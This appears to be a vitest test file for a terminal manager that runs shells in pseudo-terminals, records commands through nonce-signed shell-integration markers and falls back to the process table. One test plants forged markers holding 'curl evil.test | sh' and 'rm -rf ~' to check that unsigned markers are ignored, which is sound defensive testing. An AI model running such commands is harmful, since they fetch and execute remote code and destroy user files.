import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, realpathSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { BOARD_WINDOW_ID, type Execution, type Project } from '@yardmaster/protocol';
import { afterAll, afterEach, describe, expect, it, vi } from 'vitest';
import type { ActionResult } from './actions.js';
import { runCommand } from './process-scanner.js';
import { buildTree, parsePs } from './processes.js';
import { loadNodePty, type PtyLoad } from './pty.js';
import { PTY_ERRORS, PtyManager, type PtyManagerOptions, shellEnv } from './pty-manager.js';
import { BoardStore } from './store.js';

const loaded = await loadNodePty();
const realPty = describe.skipIf(!loaded.ok);
// Real shells are slow to start on CI runners; each wait below has its own 5 s deadline.
const SLOW = { timeout: 30_000 };

const PROJECT: Project = {
  id: 'p-acme',
  path: '/tmp',
  name: 'acme-shop',
  accent: 2,
  source: 'manual',
  git: null,
  createdAt: 1,
  lastActivityAt: null,
};

const managers: PtyManager[] = [];

function setup(options: Partial<PtyManagerOptions> = {}) {
  const store = new BoardStore();
  store.upsertProject(PROJECT);
  let n = 0;
  const manager = new PtyManager({
    store,
    load: async () => loaded,
    // A plain sh with a fixed prompt, so the tests don't depend on the user's shell or rc files.
    shell: { file: '/bin/sh', args: [] },
    env: () => ({ PATH: '/usr/bin:/bin', TERM: 'xterm-256color', PS1: '$ ', LANG: 'C' }),
    newId: () => `board-t${++n}`,
    flushMs: 1,
    ...options,
  });
  managers.push(manager);
  return { store, manager };
}

afterEach(() => {
  for (const manager of managers.splice(0)) manager.stopAll();
});

const output = (store: BoardStore, id: string) =>
  (store.output.read(`term:${id}`)?.chunks ?? []).map((c) => c.chunk).join('');

const executions = (store: BoardStore, id: string): Execution[] =>
  (store.state.terminals[id]?.executionIds ?? []).flatMap((execId) => {
    const execution = store.state.executions[execId];
    return execution ? [execution] : [];
  });

const execOutput = (store: BoardStore, execId: string) =>
  (store.output.read(`exec:${execId}`)?.chunks ?? []).map((c) => c.chunk).join('');

/** The shell's children, so an interrupt can't land before the command forked. */
const children = (pid: number) => {
  try {
    return execFileSync('pgrep', ['-P', String(pid)], { encoding: 'utf8' }).trim();
  } catch {
    return '';
  }
};

const processTree = async () =>
  buildTree(
    parsePs(
      await runCommand(
        'ps',
        process.platform === 'linux'
          ? ['-eo', 'pid=,ppid=,pcpu=,rss=,args=']
          : ['-axo', 'pid=,ppid=,pcpu=,rss=,command='],
      ),
    ),
  );

async function created(manager: PtyManager, command?: string): Promise<string> {
  const result = await manager.create({
    projectId: PROJECT.id,
    cwd: PROJECT.path,
    name: PROJECT.name,
    ...(command !== undefined ? { command } : {}),
  });
  if (!result.ok || !result.terminalId) throw new Error(`create failed: ${JSON.stringify(result)}`);
  return result.terminalId;
}

realPty('PtyManager with a real pty', SLOW, () => {
  it('runs a shell in the project folder and streams its output', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    expect(store.state.terminals[id]).toMatchObject({
      windowId: BOARD_WINDOW_ID,
      origin: 'board',
      projectId: PROJECT.id,
      name: 'acme-shop',
      cwd: '/tmp',
      state: 'open',
      active: true,
    });
    expect(store.state.terminals[id]?.shellPid).toBeGreaterThan(0);
    expect(manager.liveCount).toBe(1);

    manager.input(id, 'echo hello-$((40 + 2)); pwd\r');
    await vi.waitFor(() => expect(output(store, id)).toContain('hello-42'), { timeout: 5_000 });
    await vi.waitFor(() => expect(output(store, id)).toMatch(/\/tmp\r?\n/));
  });

  it('types the initial command', async () => {
    const { store, manager } = setup();
    const id = await created(manager, 'echo started-$((1 + 1))');
    await vi.waitFor(() => expect(output(store, id)).toContain('started-2'), { timeout: 5_000 });
  });

  it('closes the terminal with the exit code', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    manager.sendText(id, 'exit 7', true);
    await vi.waitFor(() => expect(store.state.terminals[id]?.state).toBe('closed'), {
      timeout: 5_000,
    });
    expect(store.state.terminals[id]).toMatchObject({ exitCode: 7, active: false });
    expect(manager.liveCount).toBe(0);
    // Its output stays readable, and input to it is refused.
    expect(output(store, id)).toContain('exit 7');
    expect(manager.input(id, 'x')).toEqual({ ok: false, error: 'terminal_closed' });
  });

  it('interrupts a running command with Ctrl+C', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    // The child shell says when it runs (the echoed line reads `st''arted`, its output
    // `started`), so the interrupt can't reach the parent shell before it forked.
    manager.sendText(id, "sh -c 'echo st''arted; sleep 30'", true);
    await vi.waitFor(() => expect(output(store, id)).toContain('started'), { timeout: 5_000 });
    expect(manager.interrupt(id)).toEqual({ ok: true });
    // Asked on its own line: dash (Linux's sh) drops the rest of a line after an interrupt.
    manager.sendText(id, 'echo after-$?', true);
    await vi.waitFor(() => expect(output(store, id)).toContain('after-130'), { timeout: 5_000 });
  });

  it('resizes the pty', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    expect(manager.resize(id, 101, 37)).toEqual({ ok: true });
    manager.sendText(id, 'stty size', true);
    await vi.waitFor(() => expect(output(store, id)).toContain('37 101'), { timeout: 5_000 });
  });

  it('kills a terminal on close, then removes it on a second close', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    expect(manager.close(id)).toEqual({ ok: true });
    await vi.waitFor(() => expect(store.state.terminals[id]?.state).toBe('closed'), {
      timeout: 5_000,
    });
    expect(manager.close(id)).toEqual({ ok: true });
    expect(store.state.terminals[id]).toBeUndefined();
  });

  it('stops a closing project: Ctrl+C first, then a kill after the grace period', async () => {
    const { store, manager } = setup();
    const quits = await created(manager);
    const stays = await created(manager);
    // One exits on Ctrl+C; the other ignores it and has to be killed. The first is a
    // non-interactive sh in the shell's place: an interactive dash defers its INT trap until
    // the next line is entered.
    manager.sendText(
      quits,
      `exec sh -c 'trap "exit 3" INT; echo re""ady-1; while :; do sleep 1; done'`,
      true,
    );
    manager.sendText(stays, "trap '' INT; echo re''ady-2", true);
    await vi.waitFor(() => expect(output(store, quits)).toContain('ready-1'), { timeout: 5_000 });
    await vi.waitFor(() => expect(output(store, stays)).toContain('ready-2'), { timeout: 5_000 });
    manager.stopProject(PROJECT.id, 1_500);
    await vi.waitFor(() => expect(store.state.terminals[quits]?.exitCode).toBe(3), {
      timeout: 5_000,
    });
    expect(store.state.terminals[stays]?.state).toBe('open');
    await vi.waitFor(() => expect(store.state.terminals[stays]?.state).toBe('closed'), {
      timeout: 5_000,
    });
    expect(manager.liveCount).toBe(0);
  });

  it("leaves other projects' terminals running when one closes", async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    manager.stopProject('ffffffffffff', 0);
    await new Promise((resolve) => setTimeout(resolve, 50));
    expect(store.state.terminals[id]?.state).toBe('open');
  });

  it('ends every shell when the server stops, without touching the board again', async () => {
    const { store, manager } = setup();
    const id = await created(manager);
    const pid = store.state.terminals[id]?.shellPid as number;
    manager.stopAll();
    await vi.waitFor(() => expect(() => process.kill(pid, 0)).toThrow(), { timeout: 5_000 });
    expect(store.state.terminals[id]?.state).toBe('open');
    expect(await manager.create({ projectId: PROJECT.id, cwd: '/tmp', name: 'x' })).toEqual({
      ok: false,
      error: PTY_ERRORS.unavailable,
    });
  });

  it('runs at most `max` terminals', async () => {
    const { manager } = setup({ max: 2 });
    await created(manager);
    const second = created(manager);
    const third = manager.create({ projectId: PROJECT.id, cwd: '/tmp', name: 'x' });
    await second;
    expect(await third).toEqual({ ok: false, error: PTY_ERRORS.tooMany });
  });
});

// A throwaway home with no dotfiles stands in for the user's (like `zsh -f` / `bash --norc`),
// so only the injected integration loads.
const scratch = realpathSync(mkdtempSync(join(tmpdir(), 'yardmaster-shells-')));
afterAll(() => rmSync(scratch, { recursive: true, force: true }));

const SHELLS = [
  { name: 'zsh', file: '/bin/zsh' },
  { name: 'bash', file: '/bin/bash' },
].filter((shell) => existsSync(shell.file));

realPty.each(SHELLS)('PtyManager with $name and the shell integration', ({ name, file }) => {
  const home = join(scratch, name);
  const project = join(home, 'acme-shop');
  mkdirSync(join(project, 'web'), { recursive: true });

  const integrated = (command?: string, args: string[] = []) => {
    const { store, manager } = setup({
      shell: { file, args },
      env: () => ({
        PATH: '/usr/bin:/bin',
        TERM: 'xterm-256color',
        HOME: home,
        LANG: 'C',
        BASH_SILENCE_DEPRECATION_WARNING: '1',
      }),
      integrationDir: join(home, '.yardmaster', 'shell-integration'),
    });
    const id = manager.create({
      projectId: PROJECT.id,
      cwd: project,
      name: PROJECT.name,
      ...(command !== undefined ? { command } : {}),
    });
    return { store, manager, id: id.then((r) => r.terminalId as string) };
  };

  it('reports each command with its exit code, cwd and output', async () => {
    const { store, manager, id: created } = integrated('echo hi');
    const id = await created;
    const done = (n: number) =>
      vi.waitFor(
        () => {
          const list = executions(store, id);
          expect(list).toHaveLength(n);
          expect(list.at(-1)).toMatchObject({ endedAt: expect.any(Number) });
        },
        { timeout: 10_000 },
      );

    // The launch command is typed at the first prompt and becomes an execution.
    await done(1);
    expect(store.state.terminals[id]).toMatchObject({ shellIntegration: true, cwd: project });

    manager.sendText(id, 'false', true);
    await done(2);
    manager.sendText(id, 'cd web', true);
    await done(3);
    manager.sendText(id, 'pwd', true);
    await done(4);

    manager.sendText(id, 'sleep 30', true);
    await vi.waitFor(() => expect(executions(store, id)).toHaveLength(5), { timeout: 10_000 });
    const pid = store.state.terminals[id]?.shellPid as number;
    await vi.waitFor(() => expect(children(pid)).not.toBe(''), { timeout: 10_000 });
    expect(executions(store, id)[4]?.endedAt).toBeNull();
    manager.interrupt(id);
    await done(5);

    const list = executions(store, id);
    expect(
      list.map(({ commandLine, exitCode, cwd, confidence }) => ({
        commandLine,
        exitCode,
        cwd,
        confidence,
      })),
    ).toEqual([
      { commandLine: 'echo hi', exitCode: 0, cwd: project, confidence: 'high' },
      { commandLine: 'false', exitCode: 1, cwd: project, confidence: 'high' },
      { commandLine: 'cd web', exitCode: 0, cwd: project, confidence: 'high' },
      { commandLine: 'pwd', exitCode: 0, cwd: join(project, 'web'), confidence: 'high' },
      { commandLine: 'sleep 30', exitCode: 130, cwd: join(project, 'web'), confidence: 'high' },
    ]);
    expect(list.every((e) => e.inferred === undefined)).toBe(true);
    expect(store.state.terminals[id]?.cwd).toBe(join(project, 'web'));
    expect(execOutput(store, list[0]?.id as string)).toMatch(/^hi\r?\n/);
    expect(execOutput(store, list[3]?.id as string)).toContain(join(project, 'web'));

    // The terminal shows the prompt and the output, but never the markers themselves.
    const shown = output(store, id);
    expect(shown).toContain('hi');
    for (const code of ['133', '633', '7']) expect(shown).not.toContain(`\x1b]${code};`);
    // The shell echoes the command itself: no extra `$ command` header.
    expect(shown).not.toContain('\x1b[2m$\x1b[22m');
  });

  it('keeps the nonce from commands, so their output signs nothing', async () => {
    const { store, manager, id: created } = integrated();
    const id = await created;
    await vi.waitFor(() => expect(store.state.terminals[id]?.shellIntegration).toBe(true), {
      timeout: 10_000,
    });
    const last = () => executions(store, id).at(-1);
    manager.sendText(id, 'echo "[$YARDMASTER_NONCE]"; env | grep -c NONCE', true);
    await vi.waitFor(() => expect(last()).toMatchObject({ endedAt: expect.any(Number) }), {
      timeout: 10_000,
    });
    expect(execOutput(store, last()?.id as string)).toMatch(/\[\]\r?\n0/);

    // A command that prints our markers, as a hostile file would: nothing is recorded from them.
    manager.sendText(
      id,
      String.raw`printf '\033]633;E;evil\007\033]133;C\007\033]133;D;0\007'`,
      true,
    );
    await vi.waitFor(() => expect(executions(store, id)).toHaveLength(2), { timeout: 10_000 });
    await vi.waitFor(() => expect(last()).toMatchObject({ endedAt: expect.any(Number) }), {
      timeout: 10_000,
    });
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect(executions(store, id).map((e) => e.commandLine)).not.toContain('evil');
    expect(executions(store, id)).toHaveLength(2);
  });

  it("loads the user's own startup files", async () => {
    const rc = name === 'zsh' ? '.zshrc' : '.bashrc';
    const { writeFileSync } = await import('node:fs');
    writeFileSync(join(home, rc), 'export ACME_GREETING=from-rc\n');
    try {
      const { store, manager, id: created } = integrated();
      const id = await created;
      await vi.waitFor(() => expect(store.state.terminals[id]?.shellIntegration).toBe(true), {
        timeout: 10_000,
      });
      manager.sendText(id, 'echo "$ACME_GREETING"', true);
      await vi.waitFor(
        () => expect(executions(store, id).at(-1)).toMatchObject({ endedAt: expect.any(Number) }),
        { timeout: 10_000 },
      );
      expect(execOutput(store, executions(store, id).at(-1)?.id as string)).toContain('from-rc');
    } finally {
      rmSync(join(home, rc), { force: true });
    }
  });
  it('works as a login shell, and leaves nested shells to their own startup files', async () => {
    const { store, manager, id: created } = integrated(undefined, ['-l']);
    const id = await created;
    await vi.waitFor(() => expect(store.state.terminals[id]?.shellIntegration).toBe(true), {
      timeout: 10_000,
    });
    // biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion.
    manager.sendText(id, 'echo "z=${ZDOTDIR:-unset} u=${YARDMASTER_USER_ZDOTDIR:-unset}"', true);
    await vi.waitFor(
      () => expect(executions(store, id).at(-1)).toMatchObject({ endedAt: expect.any(Number) }),
      { timeout: 10_000 },
    );
    const echoed = execOutput(store, executions(store, id).at(-1)?.id as string);
    expect(echoed).toContain(name === 'zsh' ? `z=${home} u=unset` : 'z=unset u=unset');
  });
});

realPty('PtyManager without shell integration', SLOW, () => {
  it('infers a running execution from the process table', async () => {
    const { store, manager } = setup({ markerTimeoutMs: 50 });
    const id = await created(manager);
    const pid = store.state.terminals[id]?.shellPid as number;
    manager.sendText(id, 'sleep 30', true);
    await vi.waitFor(() => expect(children(pid)).not.toBe(''), { timeout: 5_000 });

    manager.sample(await processTree());
    const [execution] = executions(store, id);
    expect(execution).toMatchObject({
      commandLine: 'sleep 30',
      confidence: 'low',
      inferred: true,
      endedAt: null,
      exitCode: null,
    });
    expect(store.state.terminals[id]?.shellIntegration).toBe(false);
    // Still running at the next sample: the same execution.
    manager.sample(await processTree());
    expect(executions(store, id)).toHaveLength(1);

    manager.interrupt(id);
    await vi.waitFor(() => expect(children(pid)).toBe(''), { timeout: 5_000 });
    manager.sample(await processTree());
    expect(executions(store, id)).toEqual([
      expect.objectContaining({ id: execution?.id, exitCode: null, inferred: true }),
    ]);
    expect(executions(store, id)[0]?.endedAt).not.toBeNull();
  });
});

describe('PtyManager without a pty', () => {
  const fake = (): PtyLoad => ({
    ok: true,
    spawn: () => ({
      pid: 4242,
      onData: () => ({ dispose() {} }),
      onExit: () => ({ dispose() {} }),
      write: () => {},
      resize: () => {},
      kill: () => {},
    }),
  });

  it('refuses when node-pty did not load', async () => {
    const { manager } = setup({ load: async () => ({ ok: false, reason: 'no binary' }) });
    expect(await manager.availability()).toEqual({ available: false, reason: 'no binary' });
    const create = manager.createAction();
    expect(await create({ kind: 'terminal.create', projectId: PROJECT.id })).toEqual({
      ok: false,
      error: PTY_ERRORS.unavailable,
    });
  });

  it('answers a spawn failure', async () => {
    const { manager } = setup({
      load: async () => ({
        ok: true,
        spawn: () => {
          throw new Error('posix_spawnp failed');
        },
      }),
    });
    expect(await manager.create({ projectId: PROJECT.id, cwd: '/tmp', name: 'x' })).toEqual({
      ok: false,
      error: PTY_ERRORS.spawnFailed,
    });
  });

  it('creates in the project folder, named after it, and only the newest is active', async () => {
    const { store, manager } = setup({ load: async () => fake() });
    const create = manager.createAction();
    expect(await create({ kind: 'terminal.create', projectId: PROJECT.id })).toEqual({ ok: true });
    expect(
      await create({ kind: 'terminal.create', projectId: PROJECT.id, name: 'server' }),
    ).toEqual({ ok: true });
    expect(store.state.terminals['board-t1']).toMatchObject({ name: 'acme-shop', active: false });
    expect(store.state.terminals['board-t2']).toMatchObject({
      name: 'server',
      cwd: '/tmp',
      active: true,
    });
    expect(await create({ kind: 'terminal.create', projectId: 'nope' })).toEqual({
      ok: false,
      error: 'unknown_project',
    });
  });

  it('routes actions on board terminals here and the rest to the editor', async () => {
    const { store, manager } = setup({ load: async () => fake() });
    const id = await created(manager);
    store.upsertTerminal({ id: 'ed-1', windowId: 'w1', name: 'zsh' });
    const editor = vi.fn((): ActionResult => ({ ok: true }));
    const actions = manager.actions({
      'terminal.sendText': editor,
      'terminal.interrupt': editor,
      'terminal.rerun': editor,
      'terminal.focus': editor,
      'terminal.close': editor,
    });
    await actions['terminal.sendText']({
      kind: 'terminal.sendText',
      terminalId: id,
      text: 'ls',
      execute: true,
    });
    await actions['terminal.focus']({ kind: 'terminal.focus', terminalId: id });
    expect(editor).not.toHaveBeenCalled();
    await actions['terminal.sendText']({
      kind: 'terminal.sendText',
      terminalId: 'ed-1',
      text: 'ls',
      execute: true,
    });
    await actions['terminal.close']({ kind: 'terminal.close', terminalId: 'ed-1' });
    expect(editor).toHaveBeenCalledTimes(2);
  });
});

describe('PtyManager shell markers, with a scripted pty', () => {
  const osc = (body: string) => `\x1b]${body}\x07`;

  function scripted() {
    const writes: string[] = [];
    let emit: (data: string) => void = () => {};
    let env: Record<string, string> = {};
    const load = async (): Promise<PtyLoad> => ({
      ok: true,
      spawn: (_file, _args, options) => {
        env = options.env;
        return {
          pid: 4242,
          onData: (listener) => {
            emit = listener;
            return { dispose() {} };
          },
          onExit: () => ({ dispose() {} }),
          write: (data) => writes.push(data),
          resize: () => {},
          kill: () => {},
        };
      },
    });
    return {
      writes,
      load,
      emit: (data: string) => emit(data),
      /** The nonce the shell got, to sign markers like the integration scripts do. */
      nonce: () => env.YARDMASTER_NONCE ?? '',
    };
  }

  const dir = join(scratch, 'scripted');

  it('types the launch command at the first prompt, and turns markers into executions', async () => {
    const pty = scripted();
    const activity = vi.fn();
    const { store, manager } = setup({
      load: pty.load,
      shell: { file: '/bin/zsh', args: ['-l'] },
      integrationDir: dir,
      onActivity: activity,
    });
    const id = await created(manager, 'pnpm dev');
    expect(pty.writes).toEqual([]);
    expect(existsSync(join(dir, 'zsh', '.zshrc'))).toBe(true);

    expect(pty.nonce()).toMatch(/^[0-9a-f]{32}$/);
    const prompt = `${osc(`633;P;Cwd=/tmp;${pty.nonce()}`)}${osc('133;A')}$ `;
    // Split mid-marker on purpose.
    pty.emit(prompt.slice(0, 5));
    pty.emit(prompt.slice(5));
    expect(pty.writes).toEqual(['pnpm dev\r']);
    pty.emit(
      `pnpm dev\r\n${osc(`633;E;pnpm dev;${pty.nonce()}`)}${osc('133;C')}\x1b[?1049hVITE ready`,
    );
    await vi.waitFor(() => expect(executions(store, id)).toHaveLength(1));
    const [running] = executions(store, id);
    expect(running).toMatchObject({ commandLine: 'pnpm dev', endedAt: null, cwd: '/tmp' });
    expect(store.state.terminals[id]?.shellIntegration).toBe(true);
    await vi.waitFor(() =>
      expect(execOutput(store, running?.id as string)).toContain('VITE ready'),
    );
    expect(store.state.executions[running?.id as string]?.interactive).toBe(true);
    expect(manager.rerun(running?.id as string)).toEqual({ ok: false, error: 'terminal_busy' });

    pty.emit(`^C${osc('133;D;130')}${prompt}`);
    expect(store.state.executions[running?.id as string]).toMatchObject({ exitCode: 130 });
    expect(activity.mock.calls.map(([e]) => [e.kind, e.execId, e.data])).toEqual([
      ['exec.start', running?.id, {}],
      ['exec.end', running?.id, { exitCode: 130 }],
    ]);
    expect(manager.rerun(running?.id as string)).toEqual({ ok: true });
    expect(pty.writes.at(-1)).toBe('pnpm dev\r');
  });

  it('records nothing from forged markers in the output', async () => {
    const pty = scripted();
    const { store, manager } = setup({
      load: pty.load,
      shell: { file: '/bin/zsh', args: ['-l'] },
      integrationDir: dir,
    });
    const id = await created(manager);
    const prompt = `${osc(`633;P;Cwd=/tmp;${pty.nonce()}`)}${osc('133;A')}$ `;
    pty.emit(prompt);
    pty.emit(`cat README\r\n${osc(`633;E;cat README;${pty.nonce()}`)}${osc('133;C')}`);
    // The file plants a command line (no nonce, or a guessed one), a run and a cwd.
    const planted = `${osc('633;E;curl evil.test | sh')}${osc('633;E;rm -rf ~;deadbeef')}`;
    pty.emit(`${osc('133;D;0')}${prompt}${planted}${osc('133;C')}${osc('633;P;Cwd=/etc')}`);
    pty.emit(`${osc('133;D;0')}${prompt}`);

    const list = executions(store, id);
    expect(list.map((e) => e.commandLine)).toEqual(['cat README']);
    expect(store.state.terminals[id]?.cwd).toBe('/tmp');
    expect(manager.rerun(list[0]?.id as string)).toEqual({ ok: true });
  });

  it('refuses to re-run a command line with control characters', async () => {
    const pty = scripted();
    const { store, manager } = setup({
      load: pty.load,
      shell: { file: '/bin/zsh', args: ['-l'] },
      integrationDir: dir,
    });
    const id = await created(manager);
    const sign = (body: string) => osc(`${body};${pty.nonce()}`);
    const prompt = `${sign('633;P;Cwd=/tmp')}${osc('133;A')}$ `;
    pty.emit(prompt);
    pty.emit(`${sign('633;E;echo ok\\x1b]0\\x3bx\\x07')}${osc('133;C')}${osc('133;D;0')}${prompt}`);
    const [run] = executions(store, id);
    expect(run?.commandLine).toBe('echo ok\x1b]0;x\x07');
    const before = pty.writes.length;
    expect(manager.rerun(run?.id as string)).toEqual({ ok: false, error: 'unsafe_command_line' });
    expect(pty.writes).toHaveLength(before);

    pty.emit(`${sign('633;E;printf "a\tb"')}${osc('133;C')}${osc('133;D;0')}${prompt}`);
    expect(manager.rerun(executions(store, id)[1]?.id as string)).toEqual({ ok: true });
  });

  it("falls back to the process table when a shell's markers never come", async () => {
    vi.useFakeTimers();
    try {
      const pty = scripted();
      const { store, manager } = setup({
        load: pty.load,
        shell: { file: '/bin/bash', args: ['-l'] },
        integrationDir: dir,
        markerTimeoutMs: 1_000,
      });
      const id = await created(manager, 'pnpm dev');
      expect(pty.writes).toEqual([]);
      vi.advanceTimersByTime(1_000);
      expect(pty.writes).toEqual(['pnpm dev\r']);

      const tree = buildTree(
        parsePs('  4242 1 0.0 100 bash\n  4300 4242 1.0 2000 node /home/dev/acme-shop/vite.js\n'),
      );
      manager.sample(tree);
      expect(executions(store, id)).toEqual([
        expect.objectContaining({
          commandLine: 'node /home/dev/acme-shop/vite.js',
          inferred: true,
        }),
      ]);
      // An unsigned marker is just output; a late signed one means the shell reports after all.
      pty.emit(osc('133;A'));
      expect(executions(store, id)[0]?.endedAt).toBeNull();
      pty.emit(osc(`633;P;Cwd=/tmp;${pty.nonce()}`) + osc('133;A'));
      expect(executions(store, id)[0]?.endedAt).not.toBeNull();
      manager.sample(tree);
      expect(executions(store, id)).toHaveLength(1);
    } finally {
      vi.useRealTimers();
    }
  });
});

describe('shellEnv', () => {
  it('drops what marks an editor terminal and sets a color terminal', () => {
    const env = shellEnv({
      PATH: '/usr/bin',
      HOME: '/home/dev',
      TERM: 'dumb',
      TERM_PROGRAM: 'vscode',
      VSCODE_INJECTION: '1',
    });
    expect(env).toEqual({
      PATH: '/usr/bin',
      HOME: '/home/dev',
      TERM: 'xterm-256color',
      COLORTERM: 'truecolor',
    });
  });
});
